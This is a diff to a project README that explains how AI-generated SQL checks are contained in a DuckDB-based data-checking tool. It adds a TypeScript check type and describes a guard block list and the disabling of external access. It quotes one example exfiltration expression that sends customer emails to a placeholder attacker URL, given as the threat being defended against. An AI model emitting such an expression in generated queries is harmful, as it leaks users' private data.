@@ -50,21 +50,44 @@ above on trust.
 
 ## How generated SQL is contained
 
-Claude writes checks that run against your data, so a generated expression like
+The AI writes checks that run against your data, so a generated expression like
 `read_csv('https://evil.example/?leak=' || customer_email)` would defeat the whole point. Two
 independent layers stop it:
 
-- **The model never emits raw SQL.** It emits a structured check — a boolean row predicate or a
-  uniqueness claim — and we build the query around it, so the `FROM` clause is always ours and the
-  result is always a count. `lib/hypotheses/guard.ts` then rejects any expression containing
-  `SELECT`, a semicolon, a comment marker, or a function that can reach a file or URL. Banning
-  `SELECT` removes subquery exfiltration entirely; a row predicate never needs one.
-- **DuckDB has the capability taken away.** The file is materialised into a table, then
-  `SET enable_external_access=false` runs before any generated SQL. `test/integration.test.ts`
-  proves this by asserting a remote read actually fails afterwards.
+- **The model never emits raw SQL.** It emits a structured check and names the table it applies
+  to, and we build the query around it, so the `FROM` clause is always ours and the result is
+  always a count:
 
-Trade-off: materialising means the file is held in browser memory rather than range-read lazily,
-so very large files are slow. The UI warns above 500 MB.
+  ```ts
+  type Check =
+    // must be true of every row of one table
+    | { kind: 'row_predicate'; table: string; expression: string }
+    // no duplicates on this column combination
+    | { kind: 'unique'; table: string; columns: string[] }
+    // every non-NULL value here also appears there — the cross-table one
+    | { kind: 'references'; table: string; columns: string[];
+        referencesTable: string; referencesColumns: string[] }
+  ```
+
+  `lib/hypotheses/guard.ts` then rejects any expression containing `SELECT`, a semicolon, a
+  comment marker, or a function that can reach a file or URL. Banning `SELECT` removes subquery
+  exfiltration entirely; a row predicate never needs one. Table names are matched against the
+  real schema before any SQL is built, so a hypothesis naming a table that does not exist is
+  reported as "not run" rather than executed.
+
+  `references` is deliberately direction-agnostic. Pointing `lineitem → orders` asks whether every
+  line belongs to a real order; reversing it asks whether every order has at least one line. Both
+  are worth testing, and the prompt says so. It is compiled to a `NOT EXISTS` anti-join that skips
+  NULL keys, exactly as a foreign key would.
+- **DuckDB has the capability taken away.** Every source is materialised into a table, then
+  `SET enable_external_access=false` runs before any generated SQL. `test/integration.test.ts`
+  proves this by asserting a remote read actually fails afterwards, and `test/reload.test.ts`
+  proves it is re-applied on every rebuild rather than only the first.
+
+Every verdict carries the SQL that produced it and how long it took, both visible in the UI.
+
+Trade-off: materialising means each source is held in browser memory rather than range-read
+lazily, so very large files are slow. The UI warns above 500 MB.
 
 ## Layout
 
